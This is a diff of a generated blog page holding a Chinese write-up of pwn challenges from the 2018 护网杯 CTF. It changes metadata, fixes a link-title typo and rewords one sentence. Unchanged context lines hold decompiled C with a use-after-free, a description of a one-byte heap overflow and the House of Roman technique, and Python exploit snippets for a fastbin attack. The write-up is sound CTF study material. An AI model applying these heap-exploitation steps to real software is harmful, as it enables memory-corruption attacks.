@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="0gur1">
 <meta property="og:description" content="task_shoppingCart基本逻辑程序分为给钱和购物两部分。 给钱部分只有给钱一个功能，money结构体中包含type和amount两个字段。给钱的时候先创建一个money结构体，然后将写好的结构体放入money_list中。 12345678910111213141516171819202122232425262728293031struct money&amp;#123;    char *">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-11-22T10:12:01.925Z">
+<meta property="og:updated_time" content="2019-01-30T15:20:39.993Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2018护网杯线上赛pwn">
 <meta name="twitter:description" content="task_shoppingCart基本逻辑程序分为给钱和购物两部分。 给钱部分只有给钱一个功能，money结构体中包含type和amount两个字段。给钱的时候先创建一个money结构体，然后将写好的结构体放入money_list中。 12345678910111213141516171819202122232425262728293031struct money&amp;#123;    char *">
@@ -330,7 +330,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  5,393字
+                  5,381字
                 </span>
               
 
@@ -384,7 +384,7 @@
 <p>remove释放地址对应的内存，没有对指针置零。而且上面也注意到，add和edit时并不检查数组是否为零等情况，因此可以多次释放、写入。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = get_day();</span><br><span class="line">  <span class="keyword">if</span> ( v0 != <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)addr_list[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="bug-1"><a href="#bug-1" class="headerlink" title="bug"></a>bug</h2><p>edit时能够造成一字节的溢出，可以覆写下一堆块的size字段。并且free后的不置零，存在UAF和double free漏洞。但本题没有输出，不能用常规方法泄露地址。</p>
-<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>要对以上的漏洞进行利用，涉及一个对我来说新的知识点：house of roman。该方法可以参考<a href="https://xz.aliyun.com/t/2316" target="_blank" rel="noopener">hackedbylh</a>的《House of Roman是实战》。</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>要对以上的漏洞进行利用，涉及一个对我来说新的知识点：house of roman。该方法可以参考<a href="https://xz.aliyun.com/t/2316" target="_blank" rel="noopener">hackedbylh</a>的《House of Roman实战》。</p>
 <p>我对House of Roman的理解是，充分利用main_arena+88这个数据，它是main_arena中unsortedbin头的地址，通过简单的变形能够得到main_arena和malloc_hook的地址。利用方法为：</p>
 <ol>
 <li>释放一个块到unsorted bin，并重新分配，保证FD，BK为main_arena+88。通过溢出修改该unsorted bin的size为0x71。</li>
@@ -398,7 +398,7 @@
 <li><p>构造unsorted bin</p>
 <p>不能直接分配unsortedbin大小的块，利用溢出。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>) <span class="comment">#0x00</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>) <span class="comment">#0x70</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">24</span>)   <span class="comment">#0xe0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>) <span class="comment">#0x100</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>) <span class="comment">#0x170</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>) <span class="comment">#0x1e0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,<span class="string">'0'</span>*<span class="number">24</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure>
-<p>前面多分配的两块0x60是有用的，后面要用到；后面分配的两个0x60一个用来消耗unsorted bin，另一个用于与top隔开。</p>
+<p>前面多分配的两块0x60是有用的，后面要用到；后面分配的两个0x60用来消耗unsorted bin。</p>
 </li>
 <li><p>fastbin attack</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">1</span>,<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
